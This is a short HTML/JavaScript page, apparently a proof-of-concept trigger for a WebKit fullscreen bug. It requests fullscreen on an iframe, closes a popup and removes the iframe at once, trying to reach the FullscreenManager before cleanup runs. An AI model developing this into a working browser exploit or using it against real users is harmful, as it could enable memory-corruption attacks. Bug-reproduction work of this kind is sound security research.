<html>
<body>
<button id="run">Run V1</button>
<div id="status">Ready</div>
<iframe id="testFrame" width="100" height="100"></iframe>
<script>
/*
  DIFERENÇA DO ORIGINAL: iframe.remove() síncrono logo após popup.close()
  sem setInterval — tenta pegar o FullscreenManager antes de qualquer
  cleanup agendado pelo fechamento do popup.
*/

var iframe = document.getElementById("testFrame");
var popup = null;

iframe.onload = function() {
    var doc = iframe.contentDocument;
    doc.open();
    doc.write(
        '<!DOCTYPE html><html><body>' +
        '<div id="target" style="width:200px;height:150px;background:red"></div>' +
        '</body></html>'
    );
    doc.close();
};

document.addEventListener('webkitfullscreenchange', function() {
    var el = document.webkitFullscreenElement;
    document.getElementById("status").innerHTML +=
        " | fsChange: " + (el ? el.tagName : "null");
    if (el) {
        try {
            document.getElementById("status").innerHTML +=
                " w=" + el.clientWidth;
        } catch(e) {
            document.getElementById("status").innerHTML += " EX:" + e;
        }
    }
});

document.getElementById("run").onclick = function() {
    popup = window.open("", "_blank", "width=400,height=300");
    popup.document.open();
    popup.document.write(
        '<!DOCTYPE html><html><body><h3>Popup</h3></body></html>'
    );
    popup.document.close();

    var frameDocument = iframe.contentDocument;
    frameDocument.documentElement.webkitRequestFullscreen();

    setTimeout(function() {
        if (!popup || popup.closed) return;

        popup.focus();
        window.focus();
        iframe.contentWindow.focus();

        setTimeout(function() {
            if (popup && !popup.closed) popup.close();

            // Remove IMEDIATAMENTE após close — sem setInterval
            iframe.remove();

            document.getElementById("status").innerHTML =
                "iframe removed sync after popup.close()";
        }, 300);
    }, 300);
};
</script>
</body>
</html>
